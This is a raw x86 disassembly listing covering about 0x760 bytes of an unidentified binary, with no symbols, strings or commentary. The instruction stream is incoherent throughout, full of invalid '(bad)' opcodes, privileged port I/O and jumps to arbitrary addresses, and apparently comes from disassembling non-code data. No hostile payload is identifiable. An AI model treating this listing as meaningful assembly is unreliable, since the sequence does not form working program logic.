  42bb54:	add    al,0x8c
  42bb56:	inc    esp
  42bb57:	or     edi,ebp
  42bb59:	jne    0x42bb57
  42bb5b:	inc    esp
  42bb5c:	sub    dh,cl
  42bb5e:	out    dx,al
  42bb5f:	mov    ds:0x5754595f,al
  42bb64:	imul   BYTE PTR [edx-0x1e0b5edd]
  42bb6a:	inc    esi
  42bb6b:	mov    bl,0x3d
  42bb6d:	sub    BYTE PTR [esi+0x7acb5e24],bl
  42bb73:	out    0x7e,al
  42bb75:	bound  ebp,QWORD PTR [esi-0x3a]
  42bb78:	xor    DWORD PTR ds:0xae5e81fa,eax
  42bb7e:	vorps  ymm1,ymm0,YMMWORD PTR [ecx+edx*1+0x55545ef5]
  42bb87:	xor    bh,BYTE PTR [edi]
  42bb89:	pop    edi
  42bb8a:	out    0xdc,eax
  42bb8c:	push   edx
  42bb8d:	popa   
  42bb8e:	add    DWORD PTR [eax-0x2e],ecx
  42bb91:	and    bh,BYTE PTR [ebx]
  42bb93:	inc    esi
  42bb94:	push   ss
  42bb95:	test   BYTE PTR [edx],al
  42bb97:	fcomip st,st(2)
  42bb99:	out    0x2e,eax
  42bb9b:	stos   DWORD PTR es:[edi],eax
  42bb9c:	jae    0x42bbfd
  42bb9e:	lahf   
  42bb9f:	ins    BYTE PTR es:[edi],dx
  42bba0:	add    al,0x61
  42bba2:	push   es
  42bba3:	das    
  42bba4:	es push edx
  42bba6:	sbb    ah,BYTE PTR [ecx]
  42bba8:	jg     0x42bbd6
  42bbaa:	out    dx,al
  42bbab:	xor    eax,0x6700a06a
  42bbb0:	pop    ebp
  42bbb1:	or     edx,ebx
  42bbb3:	mov    al,ds:0x6283bbf4
  42bbb8:	add    BYTE PTR [ecx],al
  42bbba:	mov    edx,0xc2db5dc1
  42bbbf:	std    
  42bbc0:	jp     0x42bc3e
  42bbc2:	or     ebp,edx
  42bbc4:	out    dx,al
  42bbc5:	sbb    eax,ebx
  42bbc7:	mov    al,ds:0xbaff0a8a
  42bbcc:	sub    eax,0x5919fe20
  42bbd1:	outs   dx,DWORD PTR ds:[esi]
  42bbd2:	push   ecx
  42bbd3:	repnz mov esi,0xd72f6e62
  42bbd9:	aas    
  42bbda:	mov    esp,0x4b046ca5
  42bbdf:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  42bbe1:	mov    al,ds:0xcb9c68aa
  42bbe6:	out    dx,al
  42bbe7:	cli    
  42bbe8:	xchg   ecx,eax
  42bbe9:	mov    esp,0x2a4f7a9f
  42bbee:	dec    ecx
  42bbef:	mov    eax,ds:0xcbf43a24
  42bbf4:	icebp  
  42bbf5:	sub    al,0xa9
  42bbf7:	cmc    
  42bbf8:	pop    ebx
  42bbf9:	mov    al,0x94
  42bbfb:	cdq    
  42bbfc:	inc    ecx
  42bbfd:	lahf   
  42bbfe:	ds cmps BYTE PTR cs:[esi],BYTE PTR es:[edi]
  42bc01:	rcr    DWORD PTR [ebp-0x584735f],cl
  42bc07:	and    al,BYTE PTR [ebp+0xe]
  42bc0a:	pop    eax
  42bc0b:	(bad)  
  42bc0c:	cmp    BYTE PTR [esi+0x7f],ch
  42bc0f:	and    edx,eax
  42bc11:	test   DWORD PTR [esi+0x6c],ecx
  42bc14:	lock jmp 0x42bbae
  42bc17:	mov    eax,ds:0x75ae1dde
  42bc1c:	sub    eax,0x5d10891b
  42bc21:	pop    esi
  42bc22:	shl    BYTE PTR [ecx],0x28
  42bc25:	test   BYTE PTR [ecx+0x22],0x34
  42bc29:	icebp  
  42bc2a:	les    ebp,FWORD PTR [edi]
  42bc2c:	pop    esi
  42bc2d:	dec    eax
  42bc2e:	cmc    
  42bc2f:	push   ss
  42bc30:	daa    
  42bc31:	mov    dh,0xe7
  42bc33:	adc    bl,cl
  42bc35:	pusha  
  42bc36:	aam    0x98
  42bc38:	inc    esp
  42bc39:	bound  edx,QWORD PTR [ecx-0x15c2daee]
  42bc3f:	dec    esi
  42bc40:	jnp    0x42bca5
  42bc42:	dec    edi
  42bc43:	add    al,0xdb
  42bc45:	mov    ch,BYTE PTR [ecx]
  42bc47:	test   BYTE PTR [esi+0x59d95bea],bl
  42bc4d:	popa   
  42bc4e:	adc    ebx,DWORD PTR ds:0xc04c32d2
  42bc54:	or     eax,0x370bee0e
  42bc59:	arpl   WORD PTR [ecx-0x6742b947],bp
  42bc5f:	mov    eax,ds:0xfa58912d
  42bc64:	pop    ss
  42bc65:	mov    ch,0x95
  42bc67:	mov    ds:0x271cb151,eax
  42bc6c:	push   ds
  42bc6d:	add    DWORD PTR ds:0xc26034c4,0x6e0ba1ae
  42bc77:	jecxz  0x42bcc1
  42bc79:	int3   
  42bc7a:	add    BYTE PTR ds:[ebp-0x1a77111b],0x3
  42bc82:	je     0x42bc36
  42bc84:	push   edi
  42bc85:	push   0xffffff88
  42bc87:	mov    eax,ds:0x776c6be
  42bc8c:	xchg   DWORD PTR [eax+0x59],ebx
  42bc8f:	adc    bl,BYTE PTR [esi+0x5a]
  42bc92:	ja     0x42bc9c
  42bc94:	ds (bad) 
  42bc97:	cmc    
  42bc98:	xor    esp,DWORD PTR [ecx-0x7a]
  42bc9b:	arpl   WORD PTR [esi],si
  42bc9d:	sub    esi,ecx
  42bc9f:	stos   BYTE PTR es:[edi],al
  42bca0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bca1:	inc    edx
  42bca2:	jmp    0x42bce7
  42bca4:	fnstsw WORD PTR [esi]
  42bca6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bca7:	les    ebx,FWORD PTR [edi-0x6f]
  42bcaa:	pop    ebp
  42bcab:	cli    
  42bcac:	inc    BYTE PTR [edx-0x17]
  42bcaf:	xor    edi,DWORD PTR [ebx]
  42bcb1:	out    0x92,al
  42bcb3:	mov    dl,0xd6
  42bcb5:	jp     0x42bca2
  42bcb7:	stos   BYTE PTR es:[edi],al
  42bcb8:	pop    ebx
  42bcb9:	cmp    BYTE PTR [edi-0x588ef2ae],0x9d
  42bcc0:	inc    esp
  42bcc1:	cdq    
  42bcc2:	out    dx,al
  42bcc3:	pushf  
  42bcc4:	xor    ah,dh
  42bcc6:	iret   
  42bcc7:	jb     0x42bcf4
  42bcc9:	add    ch,BYTE PTR ss:[eax-0x73273f0]
  42bcd0:	jmp    0x42bcef
  42bcd2:	jb     0x42bcde
  42bcd4:	(bad)  
  42bcd5:	cmp    eax,0x195e8f4b
  42bcda:	das    
  42bcdb:	push   ebx
  42bcdc:	bound  ebx,QWORD PTR [esi]
  42bcde:	push   ecx
  42bcdf:	popa   
  42bce0:	(bad)  
  42bce1:	pusha  
  42bce2:	lahf   
  42bce3:	cli    
  42bce4:	aas    
  42bce5:	push   es
  42bce6:	ss adc ebp,eax
  42bce9:	(bad)  
  42bcea:	clc    
  42bceb:	loope  0x42bc83
  42bced:	mov    esp,0x62db0e01
  42bcf2:	sub    DWORD PTR [ebp-0x52],esp
  42bcf5:	push   ebp
  42bcf6:	scas   eax,DWORD PTR es:[edi]
  42bcf7:	or     BYTE PTR [edi],0x5e
  42bcfa:	outs   dx,BYTE PTR ds:[esi]
  42bcfb:	push   eax
  42bcfc:	(bad)  
  42bcfd:	outs   dx,BYTE PTR ds:[esi]
  42bcfe:	fstp   DWORD PTR [edi-0x6c945e22]
  42bd04:	pop    esi
  42bd05:	test   BYTE PTR [ebx-0x44],ah
  42bd08:	jno    0x42bd2c
  42bd0a:	icebp  
  42bd0b:	or     edi,DWORD PTR [eax-0x12e2e6a3]
  42bd11:	pop    edx
  42bd12:	test   esi,0xaca4a089
  42bd18:	dec    esp
  42bd19:	sub    ebp,esi
  42bd1b:	(bad)  
  42bd1c:	outs   dx,DWORD PTR ds:[esi]
  42bd1d:	and    BYTE PTR [ebx+0x37],0x56
  42bd21:	mov    ds:0x7199a388,al
  42bd26:	(bad)  
  42bd27:	jmp    0x42bd95
  42bd29:	ja     0x42bd59
  42bd2b:	imul   esp,DWORD PTR es:[ebp-0x15],0x39f244d6
  42bd33:	jle    0x42bd17
  42bd35:	(bad)  
  42bd36:	(bad)  [eax]
  42bd38:	jmp    0x46e4469c
  42bd3d:	push   ecx
  42bd3e:	inc    esp
  42bd3f:	int    0x92
  42bd41:	sub    esp,eax
  42bd43:	ja     0x42bd67
  42bd45:	jmp    0x982a5ed0
  42bd4a:	adc    al,0x7b
  42bd4c:	ds jg  0x42bce3
  42bd4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bd50:	retf   0x77ae
  42bd53:	jmp    0x42bdbb
  42bd55:	loope  0x42bcf1
  42bd57:	mov    esp,0x28a6c7c1
  42bd5c:	push   esp
  42bd5d:	pop    ebp
  42bd5e:	(bad)  
  42bd5f:	bound  ebx,QWORD PTR [edi-0x54]
  42bd62:	scas   al,BYTE PTR es:[edi]
  42bd63:	or     esi,DWORD PTR [ebp-0x72276368]
  42bd69:	pop    ebp
  42bd6a:	dec    edi
  42bd6b:	and    DWORD PTR [esi],eax
  42bd6d:	push   0xffffffa3
  42bd6f:	ffreep st(6)
  42bd71:	sar    ebp,cl
  42bd73:	cmp    dh,BYTE PTR ds:0xaba0fea5
  42bd79:	mov    bh,0x85
  42bd7b:	popf   
  42bd7c:	lds    edx,FWORD PTR [ebx-0x1]
  42bd7f:	sahf   
  42bd80:	push   esp
  42bd81:	and    eax,0x17de0306
  42bd86:	(bad)  
  42bd87:	in     al,0x8
  42bd89:	js     0x42bd8d
  42bd8b:	fadd   QWORD PTR [eax+0x44]
  42bd8e:	imul   esi,DWORD PTR [edi+0x218868be],0x56
  42bd95:	pop    ss
  42bd96:	xchg   ebp,eax
  42bd97:	mov    ds:0x9edb4dac,al
  42bd9c:	sahf   
  42bd9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bd9e:	lods   al,BYTE PTR ds:[esi]
  42bd9f:	pop    esp
  42bda0:	push   ss
  42bda1:	jecxz  0x42bd91
  42bda3:	call   0xbe652344
  42bda8:	inc    edi
  42bda9:	movhps xmm2,QWORD PTR [edx+ecx*2+0x26a48e94]
  42bdb1:	xchg   ebx,eax
  42bdb2:	je     0x42bdc2
  42bdb4:	xchg   esi,eax
  42bdb5:	mov    ds:0x835e85fc,al
  42bdba:	and    DWORD PTR [eax+0x6d87be8c],ebx
  42bdc0:	xchg   DWORD PTR [eax-0x69],esp
  42bdc3:	pop    ebp
  42bdc4:	std    
  42bdc5:	pop    ss
  42bdc6:	icebp  
  42bdc7:	lahf   
  42bdc8:	mov    al,ds:0x8f21e7e5
  42bdcd:	fcom   DWORD PTR [ebp+0x69af5ff3]
  42bdd3:	sub    al,0xbe
  42bdd5:	lock ja 0x42bdd8
  42bdd8:	mov    al,0x60
  42bdda:	mov    al,0x1f
  42bddc:	call   0xeed0:0xe5b0816b
  42bde3:	sbb    eax,0x3c2991f2
  42bde8:	cmp    dh,dl
  42bdea:	mov    esi,0xe61567a1
  42bdef:	push   ecx
  42bdf0:	popf   
  42bdf1:	outs   dx,DWORD PTR ds:[esi]
  42bdf2:	ins    DWORD PTR es:[edi],dx
  42bdf3:	add    DWORD PTR [ebx],ebp
  42bdf5:	jae    0x42bde5
  42bdf7:	xor    DWORD PTR [eax-0x334aee4],edi
  42bdfd:	ins    DWORD PTR es:[edi],dx
  42bdfe:	das    
  42bdff:	mov    eax,ds:0x78cbc598
  42be04:	out    dx,eax
  42be05:	push   ecx
  42be06:	bound  eax,QWORD PTR ds:0x15f1945e
  42be0c:	shr    BYTE PTR [ebx+0x3],1
  42be0f:	mov    ebp,0xded05e2d
  42be14:	dec    eax
  42be15:	aad    0x8
  42be17:	push   esp
  42be18:	xchg   dl,ah
  42be1a:	loopne 0x42bdf6
  42be1c:	jp     0x42bdf5
  42be1e:	out    dx,al
  42be1f:	test   DWORD PTR [edi],edx
  42be21:	es dec esi
  42be23:	adc    BYTE PTR [edi],al
  42be25:	dec    ebx
  42be26:	mov    al,0x8c
  42be28:	sbb    edi,esp
  42be2a:	mov    ecx,fs
  42be2c:	pop    esp
  42be2d:	adc    DWORD PTR [edx-0x38],0x75ef01f0
  42be34:	mov    cl,0x61
  42be36:	js     0x42be79
  42be38:	in     al,dx
  42be39:	adc    eax,0x23de6bc0
  42be3e:	lock mov al,ds:0x599a13eb
  42be44:	or     ebx,esi
  42be46:	xchg   edi,eax
  42be47:	xchg   ecx,eax
  42be48:	pop    esi
  42be49:	hlt    
  42be4a:	xchg   ebx,eax
  42be4b:	out    dx,al
  42be4c:	test   eax,0x6a6f2208
  42be51:	pusha  
  42be52:	sar    BYTE PTR [edx],cl
  42be54:	leave  
  42be55:	out    0xa2,eax
  42be57:	test   BYTE PTR [esp+eiz*4],0xee
  42be5b:	pop    esi
  42be5c:	imul   BYTE PTR [ecx+0x73]
  42be5f:	inc    ebx
  42be60:	jns    0x42bdf3
  42be62:	sbb    eax,0xa2193a2
  42be67:	les    edi,FWORD PTR [ecx]
  42be69:	pop    esp
  42be6a:	rcl    BYTE PTR [ebx+0x76],0x89
  42be6e:	push   eax
  42be6f:	cdq    
  42be70:	push   esi
  42be71:	xchg   esi,eax
  42be72:	mov    edx,DWORD PTR [eax]
  42be74:	cwde   
  42be75:	mov    edi,0x7430c5e1
  42be7a:	sar    dh,0x5e
  42be7d:	not    eax
  42be7f:	das    
  42be80:	jns    0x42bedf
  42be82:	mov    ah,0xa3
  42be84:	or     DWORD PTR [eax+0x2a],ebp
  42be87:	call   0xbe5d:0x37a649b5
  42be8e:	out    dx,al
  42be8f:	and    esp,DWORD PTR [ecx]
  42be91:	fwait
  42be92:	dec    ecx
  42be93:	mov    al,ds:0xa0f93218
  42be98:	xchg   ecx,eax
  42be99:	retf   
  42be9a:	pop    ebx
  42be9b:	pop    esp
  42be9c:	test   al,0x6a
  42be9e:	add    esp,DWORD PTR [edi]
  42bea0:	pop    esi
  42bea1:	jmp    0x9291491c
  42bea6:	mov    eax,ds:0x425193b1
  42beab:	jp     0x42bf20
  42bead:	cwde   
  42beae:	into   
  42beaf:	inc    eax
  42beb0:	mov    ebx,0xeeba977e
  42beb5:	mov    gs,esi
  42beb7:	pop    edx
  42beb8:	mov    ah,0x21
  42beba:	push   es
  42bebb:	(bad)  
  42bebc:	(bad)  
  42bebd:	cdq    
  42bebe:	in     eax,dx
  42bebf:	mov    al,ds:0xb421f809
  42bec4:	sbb    al,0x66
  42bec6:	popa   
  42bec7:	popa   
  42bec8:	pop    esi
  42bec9:	fld    TBYTE PTR [edx-0x23ff3fca]
  42becf:	push   ss
  42bed0:	jle    0x42bf32
  42bed2:	fnsave [esi+ecx*8-0x49]
  42bed6:	pop    ebx
  42bed7:	lahf   
  42bed8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bed9:	(bad)  
  42beda:	out    dx,al
  42bedb:	inc    esp
  42bedc:	mov    ah,0x93
  42bede:	pop    ecx
  42bedf:	in     al,dx
  42bee0:	fwait
  42bee1:	int3   
  42bee2:	test   DWORD PTR [esi+0x22081d09],ecx
  42bee8:	scas   al,BYTE PTR es:[edi]
  42bee9:	cmp    eax,DWORD PTR [edx+0x19]
  42beec:	aaa    
  42beed:	mov    eax,ds:0x773c6abc
  42bef2:	popf   
  42bef3:	cs pop esi
  42bef5:	das    
  42bef6:	push   es
  42bef7:	test   eax,0xa167120f
  42befc:	cmp    DWORD PTR [eax+0x2a],0xffffff92
  42bf00:	mov    ecx,0x5e5938e6
  42bf05:	adc    BYTE PTR [esi],cl
  42bf07:	mov    ch,al
  42bf09:	imul   ebp,DWORD PTR [eax+0x79aeaf14],0x665612a1
  42bf13:	xchg   ecx,eax
  42bf14:	and    ecx,DWORD PTR [ebp+0x245e1eab]
  42bf1a:	and    esp,DWORD PTR [edx-0x47322475]
  42bf20:	ficomp DWORD PTR [ebp+0xd]
  42bf23:	rcl    BYTE PTR [ebp+0x7ea71f27],cl
  42bf29:	or     eax,0xc45e4114
  42bf2e:	fistp  QWORD PTR [ebp+0x4b]
  42bf31:	repnz outs dx,DWORD PTR ds:[esi]
  42bf33:	ins    BYTE PTR es:[edi],dx
  42bf34:	mov    dl,0x60
  42bf36:	ins    BYTE PTR es:[edi],dx
  42bf37:	mov    fs,WORD PTR [edi+edx*4-0x7e09e13]
  42bf3e:	out    dx,al
  42bf3f:	jno    0x42bfbb
  42bf41:	sbb    DWORD PTR [ecx-0x7f],ecx
  42bf44:	jbe    0x42bf26
  42bf46:	shl    BYTE PTR [eax+0x4d251b55],1
  42bf4c:	sti    
  42bf4d:	pop    ecx
  42bf4e:	adc    BYTE PTR [ebx+0x5b],bl
  42bf51:	mov    cl,0xd4
  42bf53:	not    edi
  42bf55:	ret    0x3d7
  42bf58:	mov    esi,0x8cf2da22
  42bf5d:	pusha  
  42bf5e:	test   eax,0xd2dcfd27
  42bf63:	add    al,0xe6
  42bf65:	sub    ebx,eax
  42bf67:	call   FWORD PTR [esi-0x1f]
  42bf6a:	jl     0x42bf92
  42bf6c:	dec    eax
  42bf6d:	or     eax,0x8697ea6
  42bf72:	mov    WORD PTR [ebx+0x20217237],?
  42bf78:	ins    BYTE PTR es:[edi],dx
  42bf79:	pusha  
  42bf7a:	lahf   
  42bf7b:	jo     0x42bfa8
  42bf7d:	cmovo  ecx,DWORD PTR [ebx+0x2a]
  42bf81:	and    ebp,esi
  42bf83:	lea    esp,[ebx]
  42bf85:	(bad)  
  42bf86:	mov    ch,0x2c
  42bf88:	dec    edi
  42bf89:	cld    
  42bf8a:	mov    al,ds:0xb279fa1
  42bf8f:	shl    BYTE PTR [edi+0x5d04e990],0x30
  42bf96:	pop    ebp
  42bf97:	mov    DWORD PTR [ecx+0x7],ecx
  42bf9a:	cmp    BYTE PTR [ecx-0x517f8b96],al
  42bfa0:	hlt    
  42bfa1:	std    
  42bfa2:	ins    DWORD PTR es:[edi],dx
  42bfa3:	ror    BYTE PTR [esi+0x77],cl
  42bfa6:	cld    
  42bfa7:	push   eax
  42bfa8:	xor    BYTE PTR [ecx+0x638f2d36],0xee
  42bfaf:	fadd   DWORD PTR [ebp-0x399a72c0]
  42bfb5:	jnp    0x42bfe2
  42bfb7:	mov    eax,ds:0x7b87759
  42bfbc:	aad    0x75
  42bfbe:	dec    ebp
  42bfbf:	rcr    BYTE PTR [esi+0x21],cl
  42bfc2:	rcl    eax,cl
  42bfc4:	loop   0x42bf6f
  42bfc6:	mov    esp,0x5160d394
  42bfcb:	xor    eax,0x6011984e
  42bfd0:	aad    0x63
  42bfd2:	in     al,dx
  42bfd3:	jle    0x42bfa0
  42bfd5:	mov    eax,0xa11836b0
  42bfda:	cmp    BYTE PTR [ebx],bl
  42bfdc:	jb     0x42c03e
  42bfde:	or     ecx,DWORD PTR [ebx-0x69d71dea]
  42bfe4:	mov    al,0xd1
  42bfe6:	cs mov bh,0x41
  42bfe9:	or     esi,esp
  42bfeb:	xor    BYTE PTR ds:0xab6a2f61,bh
  42bff1:	xor    al,0x68
  42bff3:	pop    ds
  42bff4:	lahf   
  42bff5:	mov    ebx,0xfe5ed0e0
  42bffa:	inc    edi
  42bffb:	mov    ds:0xc575eafe,al
  42c000:	dec    ebp
  42c001:	popa   
  42c002:	fsub   QWORD PTR [eax]
  42c004:	inc    esi
  42c005:	cwde   
  42c006:	and    ecx,ebp
  42c008:	lea    esp,[esi+0x1928ceed]
  42c00e:	pop    esp
  42c00f:	mov    ebp,0xc05e73d3
  42c014:	jge    0x42c076
  42c016:	gs clc 
  42c018:	mov    edx,0x658e1386
  42c01d:	(bad)  
  42c01e:	add    dl,cl
  42c020:	and    esp,edx
  42c022:	cs sbb ah,bl
  42c025:	mov    dl,0xa8
  42c027:	ja     0x42bfc3
  42c029:	pusha  
  42c02a:	inc    ax
  42c02c:	test   eax,0x50fb3df3
  42c031:	pop    edi
  42c032:	out    dx,al
  42c033:	mov    cl,0x23
  42c035:	mov    esi,0xf5b0e13e
  42c03a:	push   ds
  42c03b:	(bad)  
  42c03c:	jecxz  0x42c03e
  42c03e:	mov    ebp,0x11f72860
  42c043:	loop   0x42c007
  42c045:	inc    ebx
  42c046:	out    dx,al
  42c047:	xor    DWORD PTR ds:0x27d70ccb,0xa6a86df2
  42c051:	sbb    eax,DWORD PTR [edi+0x5c]
  42c054:	imul   edx,DWORD PTR [eax+0x26],0xee8abd08
  42c05b:	push   ss
  42c05c:	(bad)  
  42c05e:	stos   DWORD PTR es:[edi],eax
  42c05f:	or     bl,BYTE PTR [esi]
  42c061:	fs jle 0x42c005
  42c064:	add    BYTE PTR [esi-0x2f],0x9
  42c068:	sbb    ch,0xc8
  42c06b:	cmp    DWORD PTR [esi-0x3a],ebx
  42c06e:	leave  
  42c06f:	cmp    bl,al
  42c071:	mov    ch,0xcc
  42c073:	daa    
  42c074:	(bad)  
  42c075:	mov    ebx,0xebc9092b
  42c07a:	outs   dx,BYTE PTR ds:[esi]
  42c07b:	mov    eax,ds:0x89353774
  42c080:	into   
  42c081:	test   al,0x7c
  42c083:	jl     0x42c0e5
  42c085:	inc    edi
  42c086:	neg    BYTE PTR [edx]
  42c088:	mov    ch,0x67
  42c08a:	in     eax,dx
  42c08b:	daa    
  42c08c:	fcmovb st,st(4)
  42c08e:	popf   
  42c08f:	icebp  
  42c090:	stos   BYTE PTR es:[edi],al
  42c091:	and    bl,BYTE PTR [esi-0x14]
  42c094:	and    DWORD PTR [eax+0x1f],0x72
  42c098:	in     al,0x12
  42c09a:	xchg   BYTE PTR [ebp-0x2810ff81],ch
  42c0a0:	pop    eax
  42c0a1:	jne    0x42c07e
  42c0a3:	sbb    ch,BYTE PTR [ebx+0x17]
  42c0a6:	mov    ebx,0x366ad9e
  42c0ab:	sbb    DWORD PTR [esi+0xb],0xe84a120c
  42c0b2:	out    dx,al
  42c0b3:	adc    eax,DWORD PTR [esi+0xac9ded4]
  42c0b9:	pop    eax
  42c0ba:	jmp    DWORD PTR [edi+0x7fb2faa9]
  42c0c0:	xadd   DWORD PTR [ecx-0x23306e42],esp
  42c0c7:	mov    cl,0x5e
  42c0c9:	mov    eax,DWORD PTR [edx+0x3cd9d102]
  42c0cf:	jmp    0x42c0e7
  42c0d1:	popa   
  42c0d2:	push   0x77
  42c0d4:	mov    ds:0x3e686fbf,eax
  42c0d9:	push   edi
  42c0da:	out    dx,al
  42c0db:	not    bh
  42c0dd:	add    BYTE PTR [ecx+0x4a95ac40],0xef
  42c0e4:	mov    edx,0x8b331b60
  42c0e9:	lea    edi,[eax-0x15dc2735]
  42c0ef:	add    eax,0x4d1da2af
  42c0f4:	fidiv  WORD PTR [eax-0x69]
  42c0f7:	pop    esi
  42c0f8:	ds popa 
  42c0fa:	push   0xaa6aeaa2
  42c0ff:	mov    esi,0x67ee2a73
  42c104:	fmul   st,st(0)
  42c106:	sbb    eax,edx
  42c108:	pop    ebx
  42c109:	push   0xfffffff6
  42c10b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c10c:	or     bh,BYTE PTR [ecx-0x3f20d4d6]
  42c112:	mov    ebp,0xdf35fe
  42c117:	sub    BYTE PTR [esi+0x6aec6e4f],cl
  42c11d:	sub    edx,esp
  42c11f:	gs jo  0x42c182
  42c122:	push   edi
  42c123:	push   esi
  42c124:	and    BYTE PTR [edi-0x991b7e9],cl
  42c12a:	mov    dh,0x5
  42c12c:	push   ds
  42c12d:	and    ch,dh
  42c12f:	cs inc ebx
  42c131:	test   ebx,ebp
  42c133:	sbb    BYTE PTR [ebp-0x2d90d15c],0x60
  42c13a:	mov    dh,0x59
  42c13c:	adc    esp,DWORD PTR [edx]
  42c13e:	scas   eax,DWORD PTR es:[edi]
  42c13f:	fstp   DWORD PTR [ebx+0x227ce737]
  42c145:	jmp    0x429d:0x9ae2b03
  42c14c:	dec    esp
  42c14d:	popa   
  42c14e:	sbb    ch,dl
  42c150:	dec    eax
  42c151:	fld    TBYTE PTR [edi+edx*1+0x7b]
  42c155:	sub    eax,0x493a4ee
  42c15a:	dec    esp
  42c15b:	dec    BYTE PTR [esi+0x70a20a7f]
  42c161:	pop    eax
  42c162:	inc    DWORD PTR [ecx]
  42c164:	outs   dx,DWORD PTR ds:[esi]
  42c165:	sub    al,0xfc
  42c167:	jl     0x42c114
  42c169:	imul   ebp,esi,0x4d
  42c16c:	cwde   
  42c16d:	cld    
  42c16e:	add    eax,0xc04fafef
  42c173:	mov    al,ds:0x14ae924b
  42c178:	cmc    
  42c179:	pop    edi
  42c17a:	retf   0x5ef6
  42c17d:	test   eax,0xe32f250b
  42c182:	lods   al,BYTE PTR ds:[esi]
  42c183:	stos   BYTE PTR es:[edi],al
  42c184:	test   DWORD PTR [ecx+0xf],ebx
  42c187:	fwait
  42c188:	(bad)
  42c18c:	mov    esp,0x36af188e
  42c191:	jmp    0x60da:0xdbdda13d
  42c198:	dec    ebp
  42c199:	sub    esi,esp
  42c19b:	mov    al,ds:0x9d1294e3
  42c1a0:	push   ss
  42c1a1:	xchg   edi,eax
  42c1a2:	jle    0x42c125
  42c1a4:	pop    esi
  42c1a5:	xor    eax,0x4baa1dcc
  42c1aa:	ds daa 
  42c1ac:	sbb    BYTE PTR [edi-0x38],0x3e
  42c1b0:	(bad)  
  42c1b1:	cs inc edi
  42c1b3:	inc    eax
  42c1b4:	and    ch,BYTE PTR [ecx+0x7ef82640]
  42c1ba:	jmp    0x1e07a16
  42c1bf:	or     dh,bl
  42c1c1:	sbb    edi,DWORD PTR [ebp-0x19]
  42c1c4:	cmp    al,0x61
  42c1c6:	push   ds
  42c1c7:	xor    DWORD PTR [ecx+0x7e],ecx
  42c1ca:	push   ebp
  42c1cb:	loope  0x42c225
  42c1cd:	ins    BYTE PTR es:[edi],dx
  42c1ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c1cf:	fs pop edx
  42c1d1:	sbb    al,0x23
  42c1d3:	shl    ah,1
  42c1d5:	(bad)  
  42c1d6:	outs   dx,BYTE PTR ds:[esi]
  42c1d7:	jecxz  0x42c1b1
  42c1d9:	inc    eax
  42c1da:	inc    eax
  42c1db:	mov    eax,ds:0xf7f4f639
  42c1e0:	cmp    edi,DWORD PTR [esi-0x60a1eaff]
  42c1e6:	xor    eax,0xe2961d68
  42c1eb:	and    cl,BYTE PTR [edi]
  42c1ed:	popa   
  42c1ee:	and    al,0xb2
  42c1f0:	mov    ds:0xf158e468,eax
  42c1f5:	dec    ebx
  42c1f6:	out    0x5,eax
  42c1f8:	ds sahf 
  42c1fa:	jns    0x42c257
  42c1fc:	sahf   
  42c1fd:	idiv   BYTE PTR [ebx]
  42c1ff:	scas   eax,DWORD PTR es:[edi]
  42c200:	cld    
  42c201:	pusha  
  42c202:	mov    bl,0x45
  42c204:	mov    dl,0x90
  42c206:	cmp    BYTE PTR [edi+0x33],ch
  42c209:	out    dx,al
  42c20a:	out    dx,al
  42c20b:	xor    al,dh
  42c20d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c20e:	daa    
  42c20f:	ret    
  42c210:	out    dx,al
  42c211:	jo     0x42c1b4
  42c213:	pushf  
  42c214:	gs stos BYTE PTR es:[edi],al
  42c216:	jo     0x42c256
  42c218:	pop    esi
  42c219:	fcomp  st(5)
  42c21b:	sub    bl,0x1d
  42c21e:	add    bh,ah
  42c220:	ret    0x6e0a
  42c223:	xor    al,BYTE PTR [ebx-0x28a2ef8b]
  42c229:	pusha  
  42c22a:	gs push esp
  42c22c:	cld    
  42c22d:	mov    ds:0xd09e735f,eax
  42c232:	out    dx,al
  42c233:	scas   eax,DWORD PTR es:[edi]
  42c234:	push   eax
  42c235:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c236:	pop    edx
  42c237:	outs   dx,DWORD PTR ds:[esi]
  42c238:	xchg   ebx,eax
  42c239:	inc    ebx
  42c23a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c23b:	scas   eax,DWORD PTR es:[edi]
  42c23c:	sbb    esp,esp
  42c23e:	jo     0x42c2b9
  42c240:	data16 sub ch,dh
  42c243:	sbb    esp,DWORD PTR ds:0x510dcb01
  42c249:	daa    
  42c24a:	cmp    bl,BYTE PTR [ebp+0x34]
  42c24d:	popa   
  42c24e:	sbb    al,al
  42c250:	test   eax,0x6c2f85fc
  42c255:	pop    ecx
  42c256:	cmp    DWORD PTR [ecx-0xebe479d],edi
  42c25c:	mov    edx,DWORD PTR [esi+0x2c]
  42c25f:	pop    ebp
  42c260:	push   ebx
  42c261:	outs   dx,BYTE PTR ds:[esi]
  42c262:	loopne 0x42c218
  42c264:	and    al,0xa4
  42c266:	pop    esi
  42c267:	inc    edx
  42c268:	dec    ebp
  42c269:	sbb    al,0x3b
  42c26b:	jmp    FWORD PTR [ecx-0x4]
  42c26e:	push   esi
  42c26f:	cs call 0xd730:0x80ede860
  42c277:	add    eax,DWORD PTR [ebp-0x234111c9]
  42c27d:	aam    0xbe
  42c27f:	mov    dl,0xb7
  42c281:	fwait
  42c282:	shl    DWORD PTR [eax+0x3379fa54],cl
  42c288:	lea    ebp,[esi]
  42c28a:	push   cs
  42c28b:	ret    0x4664
  42c28e:	dec    esp
  42c28f:	pop    ecx
  42c290:	adc    ebx,edx
  42c292:	mov    edx,0x9f56bd73
  42c297:	xchg   ebp,eax
  42c298:	ds push 0x6a
  42c29b:	lahf   
  42c29c:	js     0x42c2f7
  42c29e:	push   edx
  42c29f:	ja     0x42c29f
  42c2a1:	loopne 0x42c2f1
  42c2a3:	fxch   st(1)
  42c2a5:	and    ch,dh
  42c2a7:	inc    esp
  42c2a8:	xchg   edx,eax
  42c2a9:	data16 (bad) 
  42c2ab:	cmp    al,0x7f
  42c2ad:	mov    bh,0x5a
  42c2af:	fld    QWORD PTR [edi]
  42c2b1:	cmp    eax,0xa33311eb
